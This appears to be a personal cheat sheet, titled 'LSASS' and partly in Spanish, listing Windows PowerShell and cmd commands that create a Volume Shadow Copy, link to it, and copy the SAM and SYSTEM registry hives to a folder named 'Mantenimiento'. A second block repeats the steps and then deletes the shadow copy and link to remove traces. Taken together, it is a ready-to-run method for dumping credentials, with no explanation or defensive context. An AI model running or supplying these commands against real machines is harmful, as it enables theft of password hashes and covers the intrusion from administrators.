LSASS

(Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
vssadmin list shadows
cmd /c mklink /d C:\Mantenimiento\sombra "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy17\"
copy C:\Mantenimiento\sombra\Windows\System32\config\SYSTEM C:\Mantenimiento\system2.bak
copy C:\Mantenimiento\sombra\Windows\System32\config\SAM C:\Mantenimiento\sam2.bak

----------------------------------------------

$Shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
$ShadowID = $Shadow.ShadowID
Write-Host "El ID de tu copia es: $ShadowID"
vssadmin list shadows /shadow=$ShadowID

rmdir C:\Mantenimiento\sombra
vssadmin delete shadows /shadow=$ShadowID /quiet
